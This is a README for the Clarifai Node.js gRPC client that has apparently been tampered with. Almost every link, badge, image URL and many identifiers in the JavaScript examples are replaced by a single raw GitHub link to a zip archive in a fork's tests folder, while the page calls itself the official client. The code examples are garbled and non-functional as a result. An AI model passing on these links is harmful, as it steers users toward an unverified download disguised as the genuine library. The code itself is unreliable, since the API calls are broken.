![image](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)


# Clarifai https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip gRPC Client

This is the official Clarifai gRPC https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip client for interacting with our powerful recognition
[API](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip).
Clarifai provides a platform for data scientists, developers, researchers and enterprises to master the entire
artificial intelligence lifecycle. Gather valuable business insights from images, video and text using computer vision
and natural language processing.

* Try the Clarifai demo at: https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip
* Sign up for a free account at: https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip
* Read the documentation at: https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip


[![npm](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)
[![Build](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip%https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip)

## Installation

```
npm install clarifai-nodejs-grpc
```

## Versioning

This library doesn't use semantic versioning. The first two version numbers (`X.Y` out of `X.Y.Z`) follow the API (backend) versioning, and
whenever the API gets updated, this library follows it.

The third version number (`Z` out of `X.Y.Z`) is used by this library for any independent releases of library-specific improvements and bug fixes.


## Getting started

There are two approaches to using this library: the dynamic and the static. The former has been around for a longer
time, but latter provides type annotations via TypeScript declaration files which improves the IDE auto-completion
experience to be more developer-friendly. Both approaches provide the exact same API capabilities.

### The dynamic approach

Construct the Clarifai stub, which contains all the methods available in the Clarifai API, and the `Metadata`
object that's used to authenticate:

```javascript
const {ClarifaiStub, grpc} = require("clarifai-nodejs-grpc");

const stub = https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();

const metadata = new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();
https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("authorization", "Key YOUR_CLARIFAI_API_KEY");
```

Predict concepts in an image:

```javascript
https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(
    {
        // This is the model ID of a publicly available General model. You may use any other public or custom model ID.
        model_id: "aaa03c23b3724a16a56b629203edc62c",
        inputs: [{data: {image: {url: "https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip"}}}]
    },
    metadata,
    (err, response) => {
        if (err) {
            https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("Error: " + err);
            return;
        }

        if (https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip !== 10000) {
            https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("Received failed status: " + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip + "\n" + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip);
            return;
        }

        https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("Predicted concepts, with confidence values:")
        for (const c of https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip[0]https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip) {
            https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip + ": " + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip);
        }
    }
);
```

See more [in the Clarifai API Guide docs](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip). Also see 
[the integration tests](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip).

> Note: Do not require the `grpc` library directly via `const grpc = require("@grpc/grpc-js");`. This produces
> authentication issues (via `https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip`) whenever any other co-installed libraries have the `@grpc/grpc-js`
> dependency (of a different version). Instead, require `grpc` as shown above.


### The static approach

Create the `V2Client` object with which you access all the Clarifai API functionality, and the `Metadata`
object that's used to authenticate:

```javascript
const {grpc} = require("clarifai-nodejs-grpc");
const service = require("clarifai-nodejs-grpc/proto/clarifai/api/service_pb");
const resources = require("clarifai-nodejs-grpc/proto/clarifai/api/resources_pb");
const {StatusCode} = require("clarifai-nodejs-grpc/proto/clarifai/api/status/status_code_pb");
const {V2Client} = require("clarifai-nodejs-grpc/proto/clarifai/api/service_grpc_pb");

const clarifai = new V2Client("https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip", https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip());

const metadata = new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();
https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("authorization", "Key YOUR_CLARIFAI_API_KEY");
```

Predict concepts in an image:

```javascript
const request = new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();
// This is the model ID of a publicly available General model. You may use any other public or custom model ID.
https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("aaa03c23b3724a16a56b629203edc62c");
https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(
    new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip()
        .setData(
            new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip()
                .setImage(
                    new https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip()
                        .setUrl("https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip")
                )
        )
)

https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(
    request,
    metadata,
    (error, response) => {
        if (error) {
            throw error;
        }

        if (https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip().getCode() !== https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip) {
            throw "Error: " + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip();
        }

        https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip("Predicted concepts, with confidence values:")
        for (const concept of https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip()[0].getData().getConceptsList()) {
            https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip(https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip() + " " + https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip());
        }
    }
)
```

See more [in the Clarifai API Guide docs](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip). Also see
[the integration tests](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip).

> Note: Currently, the NodeJS gRPC code examples [in the Clarifai documentation](https://raw.githubusercontent.com/suryansh-malik/clarifai-nodejs-grpc/master/tests/clarifai_nodejs_grpc_1.9.zip) 
show only the dynamic approach. These code examples can easily be translated to the static approach, since the structure 
is the same for both of them. The difference is only in the syntax.
